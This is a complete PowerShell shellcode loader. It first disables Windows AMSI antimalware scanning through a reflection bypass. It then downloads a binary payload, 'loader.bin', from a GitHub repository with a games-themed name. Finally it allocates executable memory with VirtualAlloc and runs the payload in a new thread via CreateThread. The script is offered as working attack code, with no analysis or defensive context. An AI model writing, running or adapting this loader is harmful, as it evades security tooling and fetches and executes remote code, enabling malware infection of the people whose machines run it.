[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Download the shellcode
$wc = New-Object System.Net.WebClient
$shellcode = $wc.DownloadData('https://github.com/unblockedgames2/Fanta.Live/raw/refs/heads/main/loader.bin')

# Import necessary functions
$kernel32 = [System.Runtime.InteropServices.Marshal]::GetModuleHandle("kernel32.dll")

function Get-FunctionPointer {
    param ($module, $functionName, $delegateType)
    $address = [System.Runtime.InteropServices.Marshal]::GetProcAddress($module, $functionName)
    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, $delegateType)
}

# Define necessary delegates
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public delegate UIntPtr VirtualAllocDelegate(UIntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
public delegate UIntPtr CreateThreadDelegate(UIntPtr lpThreadAttributes, uint dwStackSize, UIntPtr lpStartAddress, UIntPtr lpParameter, uint dwCreationFlags, out UIntPtr lpThreadId);
"@ -PassThru

# Get function pointers
$VirtualAlloc = Get-FunctionPointer $kernel32 "VirtualAlloc" ([VirtualAllocDelegate])
$CreateThread = Get-FunctionPointer $kernel32 "CreateThread" ([CreateThreadDelegate])

# Allocate memory for the shellcode
$buffer = $VirtualAlloc.Invoke([UIntPtr]::Zero, [UInt32]$shellcode.Length, 0x3000, 0x40)

# Copy the shellcode into the allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, [IntPtr]$buffer, $shellcode.Length)

# Create a thread to execute the shellcode
$threadId = [UIntPtr]::Zero
$CreateThread.Invoke([UIntPtr]::Zero, 0, $buffer, [UIntPtr]::Zero, 0, [ref]$threadId)
